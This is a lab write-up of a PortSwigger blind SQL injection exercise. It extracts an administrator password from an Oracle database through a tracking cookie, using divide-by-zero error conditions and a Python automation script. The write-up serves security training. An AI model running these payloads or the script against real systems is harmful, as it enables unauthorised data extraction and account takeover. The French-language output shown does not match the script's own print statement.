# PortSwigger — Blind SQL Injection with Conditional Errors

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A tracking cookie is vulnerable to blind SQL injection. The application **never returns query results** and **does not behave differently** based on whether rows are returned — but it **does return a 500 error** when the SQL query causes a runtime exception. By injecting a conditional divide-by-zero expression (`TO_CHAR(1/0)`) into an Oracle `CASE WHEN` clause, boolean conditions can be inferred one character at a time to extract the `administrator` password from the `users` table.

**Lab URL:** `https://0a2f001d04a3f1c280e03024007e0092.web-security-academy.net/`

---

## Challenge Description

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
>
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
>
> To solve the lab, log in as the `administrator` user.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection — Blind**
- Goal: Extract the `administrator` password using error-based boolean inference

---

## Recon

### Step 1 — Identify the injection point

The application sets a `TrackingId` cookie on every request:

```
Cookie: TrackingId=Of2kxvTOsTA4Q8Iq; session=...
```

Appending a single quote triggers a **500 Internal Server Error** — the value is directly interpolated into a SQL query without sanitisation:

```
TrackingId=Of2kxvTOsTA4Q8Iq'
```

### Step 2 — Confirm Oracle database

Since no data is reflected, the database type must be inferred from error behavior. Oracle requires `FROM dual` for expressions without a table — injecting a valid Oracle-only subquery confirms the engine:

```
TrackingId=xyz'||(SELECT '' FROM dual)||'   → 200 OK  ✅ (Oracle confirmed)
```

A non-Oracle database would reject `FROM dual` and return a 500 error here.

### Step 3 — Confirm the `users` table and `administrator` row exist

```
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'          → 200 OK ✅
TrackingId=xyz'||(SELECT '' FROM users WHERE username='administrator')||'  → 200 OK ✅
```

Both confirm the table and the target row are present.

---

## Exploitation

### Step 4 — Understand the conditional error technique

Since the app returns **500 on SQL error** and **200 on success**, a runtime exception can be triggered selectively based on a boolean condition:

```sql
-- Evaluates condition; if TRUE → 1/0 raises a division-by-zero → HTTP 500
-- If FALSE → '' is returned harmlessly → HTTP 200
SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE '' END FROM dual
```

Injected into the cookie:

```
TrackingId=xyz'||(SELECT CASE WHEN (<condition>) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

| Response | Meaning |
|----------|---------|
| **500** | Condition is **TRUE** |
| **200** | Condition is **FALSE** |

### Step 5 — Determine the password length

Iterating through length values until a 500 is received:

```
' || (SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

**Response: 500** → password length = **20 characters** ✅

### Step 6 — Extract the password character by character

For each position `N` (1 to 20), iterate over the charset `[a-z0-9]` until a 500 is returned:

```
' || (SELECT CASE WHEN (SUBSTR(password,N,1)='x') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

This requires up to `20 × 36 = 720` requests in the worst case. The extraction was automated with the following Python script:

```python
import requests, string

TARGET_URL  = "https://0a2f001d04a3f1c280e03024007e0092.web-security-academy.net/"
TRACKING_ID = "Of2kxvTOsTA4Q8Iq"
SESSION     = "K3LhoRxtllkOzOxRbO4tzqFyxRNoInel"
CHARSET     = string.ascii_lowercase + string.digits

def is_true(condition):
    payload = f"||(SELECT CASE WHEN ({condition}) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    cookies = {"TrackingId": f"{TRACKING_ID}'{payload}", "session": SESSION}
    return requests.get(TARGET_URL, cookies=cookies, timeout=10).status_code == 500

password = ""
length = next(l for l in range(1, 50)
              if is_true(f"(SELECT LENGTH(password) FROM users WHERE username='administrator')={l}"))

for pos in range(1, length + 1):
    for char in CHARSET:
        if is_true(f"SUBSTR((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}'"):
            password += char
            break

print(f"Password: {password}")
```

**Output:**

```
[+] Longueur trouvée : 20 caractères
  [01/20] → 'k'   Progression : k
  [02/20] → '4'   Progression : k4
  ...
  [20/20] → 'n'   Progression : k4psr5ui161ddebgfgyn

=======================================================
  [✓] MOT DE PASSE : k4psr5ui161ddebgfgyn
=======================================================
```

### Step 7 — Authenticate as administrator

Navigating to `/login`:
- **Username:** `administrator`
- **Password:** `k4psr5ui161ddebgfgyn`

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
TrackingId=xyz'   →   500 error   →   injection confirmed
        ↓
'||(SELECT '' FROM dual)||'   →   200   →   Oracle DB confirmed
        ↓
CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END   →   500   →   error oracle working
        ↓
LENGTH(password)=20   →   500   →   password is 20 chars long
        ↓
SUBSTR(password,N,1)='x' for N=1..20, char in [a-z0-9]
→ character-by-character extraction:
  k4psr5ui161ddebgfgyn
        ↓
Login as administrator → LAB SOLVED ✅
```

---

## Key Takeaways

- **Blind SQLi with conditional errors** is possible even when the app returns no data and no boolean difference — a controlled runtime exception (divide-by-zero) acts as the signal channel
- **Oracle-specific syntax** (`CASE WHEN`, `TO_CHAR(1/0)`, `FROM dual`, `SUBSTR`, `LENGTH`) must be used; MySQL/MSSQL/PostgreSQL each have their own equivalents
- **Automation is essential** — manual extraction of a 20-character password over 700 requests is impractical; a simple Python script reduces it to ~2 minutes
- **Cookie injection** is often overlooked — non-form parameters like analytics or session tracking cookies are just as injectable as visible URL parameters
- The password is stored in **plaintext**, meaning a single SQL injection is sufficient for a complete account takeover

---

## References

- [PortSwigger — Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [PortSwigger — Blind SQLi with Conditional Errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-312: Cleartext Storage of Sensitive Information](https://cwe.mitre.org/data/definitions/312.html)